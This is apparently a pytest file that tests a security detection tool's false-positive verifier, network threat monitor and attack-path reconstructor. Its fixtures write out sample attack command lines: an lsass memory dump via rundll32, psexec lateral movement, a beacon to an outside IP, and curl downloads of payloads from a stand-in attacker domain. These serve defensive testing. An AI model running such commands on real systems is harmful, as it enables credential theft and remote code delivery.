"""Tests for PathWarden False Positive Verification and Network Threat Monitoring."""

import pytest

from correlation.fp_verifier import FalsePositiveVerifier, fp_verifier
from detection.network_threat_monitor import NetworkThreatMonitor, network_threat_monitor
from correlation.path_reconstructor import PathReconstructor, AttackStep, MitreDetail
from correlation.incident_clusterer import IncidentCluster
from correlation.relationship_scorer import ScoredRelationship


def test_fp_verifier_confirmed_attack():
    verifier = FalsePositiveVerifier()
    steps = [
        {
            "step_uid": "S1",
            "host_name": "WS-01",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc AAAA...",
            "rule_id": "R-WIN-4688",
            "mitre": {"tactic": "Initial Access"},
        },
        {
            "step_uid": "S2",
            "host_name": "WS-01",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe update.dll lsass.exe minidump",
            "rule_id": "R-SYSMON-10",
            "mitre": {"tactic": "Credential Access"},
        },
        {
            "step_uid": "S3",
            "host_name": "DC-01",
            "process_name": "services.exe",
            "command_line": "psexec.exe \\\\DC-01 cmd.exe",
            "rule_id": "R-ZEEK-SMB",
            "mitre": {"tactic": "Lateral Movement"},
        },
    ]
    edges = [{"edge_id": "E1"}, {"edge_id": "E2"}, {"edge_id": "E3"}]
    res = verifier.verify_incident(steps, edges, ["WS-01", "DC-01"])

    assert res.verdict == "CONFIRMED_MALICIOUS_ATTACK"
    assert res.attack_confidence >= 0.85
    assert res.false_positive_risk <= 0.15
    assert res.objective_achieved is True
    assert res.is_admin_tool_signature is False
    assert any("Credential Dumping" in p for p in res.explanation_points)


def test_fp_verifier_benign_admin_activity():
    verifier = FalsePositiveVerifier()
    steps = [
        {
            "step_uid": "S1",
            "host_name": "SRV-APP",
            "process_name": "CcmExec.exe",
            "command_line": "C:\\Windows\\CCM\\CcmExec.exe /run",
            "rule_id": "R-WIN-4688",
            "mitre": {"tactic": "Execution"},
        }
    ]
    res = verifier.verify_incident(steps, [], ["SRV-APP"])

    assert res.verdict == "BENIGN_ADMIN_ACTIVITY"
    assert res.false_positive_risk >= 0.70
    assert res.is_admin_tool_signature is True
    assert res.objective_achieved is False


def test_network_threat_monitor_c2_beaconing():
    monitor = NetworkThreatMonitor()
    step_data = {
        "command_line": "C:\\Windows\\Temp\\beacon.exe --connect 198.51.100.44:443",
        "process_name": "beacon.exe",
        "dst_ip": "198.51.100.44",
        "dst_port": 443,
        "mitre": {"tactic": "Command and Control"},
    }
    threat = monitor.analyze_step_telemetry(step_data)
    assert threat is not None
    assert threat.threat_category == "C2_BEACONING"
    assert threat.destination_ip == "198.51.100.44"
    assert threat.destination_port == 443
    assert threat.direction == "OUTBOUND"


def test_network_threat_monitor_malicious_drop_site():
    monitor = NetworkThreatMonitor()
    step_data = {
        "command_line": "curl -s -O https://evil-payload.cdn-update.com/payload.ps1",
        "process_name": "curl.exe",
        "mitre": {"tactic": "Execution"},
    }
    threat = monitor.analyze_step_telemetry(step_data)
    assert threat is not None
    assert threat.threat_category == "MALICIOUS_DROP_SITE"
    assert threat.destination_domain == "evil-payload.cdn-update.com"
    assert threat.network_protocol == "HTTPS"


def test_path_reconstructor_with_network_threat():
    reconstructor = PathReconstructor()
    reconstructor.load_detection_metadata([
        {
            "detection_id": "DET-1",
            "event_ts": 1000.0,
            "host_name": "WS-01",
            "process_name": "curl.exe",
            "command_line": "curl https://evil-payload.cdn-update.com/beacon.bin",
            "severity": "HIGH",
            "tactic": "Command and Control",
        }
    ])
    cluster = IncidentCluster(
        cluster_id="INC-1",
        detection_ids={"DET-1"},
        relationships=[],
        kill_chain_stages={"Command and Control"},
        has_strong_causal_edge=True,
        passed_gate=True,
    )
    steps, edges = reconstructor.reconstruct(cluster)
    assert len(steps) == 1
    assert steps[0].network_threat is not None
    assert steps[0].network_threat.threat_category == "MALICIOUS_DROP_SITE"
